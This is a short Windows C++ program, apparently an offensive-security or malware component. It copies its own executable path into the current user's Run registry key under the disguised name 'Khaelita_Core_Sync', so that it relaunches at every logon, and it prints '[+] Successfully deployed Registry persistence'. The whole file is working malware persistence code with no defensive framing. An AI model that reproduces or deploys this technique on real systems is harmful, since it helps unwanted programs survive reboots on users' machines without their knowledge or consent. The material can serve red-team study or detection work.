#include <windows.h>
#include <iostream>
#include <string>

int main() {

    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    std::string currentPath(buffer);

    const char* entryName = "Khaelita_Core_Sync";
    const char* registryPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    HKEY hKey;

    LONG openStatus = RegOpenKeyExA(HKEY_CURRENT_USER, registryPath, 0, KEY_SET_VALUE, &hKey);

    if (openStatus == ERROR_SUCCESS) {
        LONG setStatus = RegSetValueExA(
            hKey,
            entryName,
            0,
            REG_SZ,
            (const BYTE*)currentPath.c_str(),
            currentPath.length() + 1
        );

        if (setStatus == ERROR_SUCCESS) {
            std::cout << "[+] Successfully deployed Registry persistence." << std::endl;
        }
        else {
            std::cerr << "[-] Failed to set Registry value." << std::endl;
        }

        RegCloseKey(hKey);
    }
    else {
        std::cerr << "[-] Failed to open Registry key." << std::endl;
    }

    std::cout << "[*] Khaelita Research Module initialized." << std::endl;

    system("pause");

    return 0;
}